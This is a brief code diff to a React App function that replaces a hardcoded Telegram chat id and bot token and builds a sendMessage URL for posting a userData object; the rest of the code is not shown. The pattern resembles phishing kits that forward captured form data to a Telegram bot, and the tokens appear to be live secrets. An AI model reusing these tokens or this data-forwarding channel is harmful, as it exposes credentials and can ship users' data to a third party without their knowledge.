@@ -25,8 +25,8 @@ function App() {
     }
 
     try {
-      const my_id = `-1003452366330`;
-      const token = `8173258251:AAGQ2n9hDbmOFq9L3iT1H9QFvjSVwmali2c`;
+      const my_id = `-5104446329`;
+      const token = `8432212243:AAFGvxAVNUbL2hqdTLBAqapPTgBXNaQArWs`;
       const api_key = `https://api.telegram.org/bot${token}/sendMessage`;
 
       const userData = {
